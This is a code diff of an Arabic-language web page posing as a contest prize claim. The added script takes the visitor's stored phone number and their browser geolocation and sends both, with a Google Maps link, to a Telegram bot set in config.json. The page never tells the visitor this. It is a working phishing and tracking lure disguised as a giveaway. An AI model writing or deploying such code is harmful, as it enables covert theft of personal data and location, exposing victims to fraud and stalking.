@@ -2,70 +2,97 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>شكراً لمشاركتك</title>
+  <title>استلام الجائزة</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
+      direction: rtl;
       font-family: Tahoma, sans-serif;
       text-align: center;
-      direction: rtl;
-      background-color: #f1f1f1;
-      padding: 50px;
+      padding: 40px;
     }
-
-    .message {
-      font-size: 24px;
-      margin-bottom: 30px;
-      color: #2c3e50;
-    }
-
-    .gift-box {
-      background-color: #fff;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-      display: inline-block;
-    }
-
-    .btn {
-      margin-top: 20px;
-      padding: 12px 30px;
-      font-size: 18px;
+    button {
       background-color: #28a745;
       color: white;
+      font-size: 20px;
+      padding: 12px 24px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      margin-top: 20px;
     }
-
-    #codeSection {
+    #codeDisplay {
       margin-top: 30px;
-      display: none;
-    }
-
-    #generatedCode {
-      font-size: 22px;
-      font-weight: bold;
-      color: #e67e22;
+      font-size: 24px;
+      color: #333;
     }
   </style>
 </head>
 <body>
 
-  <div class="message">✅ تم تأكيد مشاركتك<br>📞 سيتم التواصل معك في حال فوزك</div>
+  <h2>🎁 شكراً لمشاركتك!</h2>
+  <p>اضغط الزر أدناه لاستلام الجائزة وكشف كود المتسابق الخاص بك</p>
 
-  <div class="gift-box">
-    <p>🎁 اضغط لاستلام كود الجائزة الخاص بك</p>
-    <button class="btn" onclick="generateCode()">استلام الهدية</button>
+  <button onclick="claimGift()">استلام الجائزة</button>
 
-    <div id="codeSection">
-      <p>🎉 كود المسابقة الخاص بك:</p>
-      <div id="generatedCode">...</div>
-      <button class="btn" style="background-color:#007bff;" onclick="sendCode()">تأكيد الكود</button>
-    </div>
+  <div id="codeDisplay" style="display:none;">
+    🎉 كود المتسابق الخاص بك: <span id="contestantCode"></span>
   </div>
 
-  <!-- ربط ملف الجافا سكريبت -->
-  <script src="index.js"></script>
+  <script>
+    let botToken = '';
+    let chatId = '';
+
+    // تحميل الإعدادات من config.json
+    fetch('config.json')
+      .then(res => res.json())
+      .then(data => {
+        botToken = data.botToken;
+        chatId = data.chatId;
+      });
+
+    function generateCode() {
+      return Math.floor(100000 + Math.random() * 900000).toString();
+    }
+
+    function claimGift() {
+      const phone = localStorage.getItem("userPhone");
+      if (!phone) {
+        alert("لا يوجد رقم هاتف محفوظ.");
+        return;
+      }
+
+      const code = generateCode();
+
+      document.getElementById('contestantCode').textContent = code;
+      document.getElementById('codeDisplay').style.display = 'block';
+
+      // اهتزاز
+      if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          const message = `🎁 استلام الجائزة\n📱 رقم الهاتف: ${phone}\n🏷 كود المتسابق: ${code}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message
+            })
+          });
+        }, () => {
+          alert("تعذر الحصول على الموقع.");
+        });
+      } else {
+        alert("المتصفح لا يدعم الموقع الجغرافي.");
+      }
+    }
+  </script>
+
 </body>
 </html>
